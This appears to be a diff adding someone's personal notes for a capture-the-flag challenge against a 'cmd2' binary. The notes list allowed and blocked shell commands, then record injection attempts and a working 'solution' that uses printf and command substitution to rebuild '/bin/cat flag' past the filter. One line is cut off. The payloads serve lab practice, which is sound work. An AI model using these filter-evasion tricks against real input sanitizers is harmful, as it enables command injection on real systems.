@@ -1,0 +1,33 @@
+yes:
+pwd
+cd
+echo
+printf
+
+no:
+chmod
+ls
+cp
+mkdir
+mv
+
+printf "%cbin" $(echo -n -e "\x2f")
+./cmd2 "printf \"__%cbin__\\n\" \$(echo \\-n \\-e \"\\x2f\")"
+./cmd2 "printf \"__%cbin__\\n\" \\x57"
+./cmd2 "printf \"%c%s\" 
+./cmd2 "printf \"%cbin%ccat %clag\" $(echo -n -e \"\\x2f\") $(echo -n -e \"\\x2f\") $(echo -n -e \"\\x66\")"
+./cmd2 "\$(printf \"\%chi\" \$(echo -n -e \"\\x2f\"))"
+./cmd2 "printf \"%c\" \$(echo -n -e \"A\")"
+./cmd2 "printf \"%c\" \$('echo -n -e \"A\"')"
+
+*** solution:
+cat flag
+printf "cat flag"
+printf "%cbin%ccat %clag" >(echo -n -e "") >(echo -n -e "") f
+printf "%cbin%ccat %clag" $(pwd) $(pwd) f
+./cmd2 "printf \"%cbin%ccat %clag\" \$(pwd) \$(pwd) f"
+./cmd2 "\$(printf \"%cbin%ccat %clag\" \$(pwd) \$(pwd) f)"
+
+*** failed attempts with echo: need to escape the $ character which causes headaches
+./cmd2 "printf \"%cbin%ccat %clag\" $(echo -n -e \"A\") $(echo -n -e \"B\") $(echo -n -e \"C\")"
+./cmd2 "printf \"%cbin%ccat %clag\" $(echo -n -e \"\\x61\") $(echo -n -e \"B\") $(echo -n -e \"C\")"
